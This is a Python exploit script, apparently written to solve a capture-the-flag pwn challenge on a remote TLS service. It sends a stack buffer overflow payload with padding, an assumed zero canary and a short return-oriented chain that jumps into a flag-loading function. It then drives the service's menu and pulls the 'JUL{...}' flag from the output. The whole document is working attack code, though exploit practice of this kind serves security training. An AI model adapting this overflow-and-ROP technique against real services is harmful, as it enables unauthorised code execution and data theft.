import socket
import ssl
import time

HOST = "2b4446b928232a49.julec.tf"
PORT = 1337

CANARY = b"\x00" * 8
BUF_TO_CANARY = 40

POP_RBP = 0x40141d
TARGET_RBP = 0x400054
LOAD_FLAG = 0x401b7e  # Jump past prologue!

payload = (
    b"A" * BUF_TO_CANARY
    + CANARY
    + b"B" * 8
    + (POP_RBP).to_bytes(8, "little")
    + (TARGET_RBP).to_bytes(8, "little")
    + (LOAD_FLAG).to_bytes(8, "little")
)

print(f"Payload length: {len(payload)}")
print(f"Connecting to {HOST}:{PORT}...")

raw = socket.create_connection((HOST, PORT), timeout=5)
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
s = ctx.wrap_socket(raw, server_hostname=HOST)

s.sendall(str(len(payload)).encode() + b"\n")

buf = b""
s.settimeout(3.0)
while True:
    chunk = s.recv(1024)
    if not chunk: break
    buf += chunk
    if b"what is your name?" in buf:
        break

s.sendall(payload)
time.sleep(1)
print("Navigating to LOC_SLEIGH...")
s.sendall(b"3\n")
time.sleep(0.3)
s.sendall(b"1\n")

s.settimeout(3.0)
full_output = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk: break
        full_output += chunk
        print(chunk.decode(errors='replace'), end='')
except:
    pass

s.close()

if b"JUL{" in full_output:
    print("\n\n*** FLAG FOUND! ***")
    output_str = full_output.decode(errors='replace')
    if "JUL{" in output_str:
        start = output_str.index("JUL{")
        end = output_str.index("}", start) + 1
        print(f"Flag: {output_str[start:end]}")
else:
    print("\n\nNo flag found in output.")
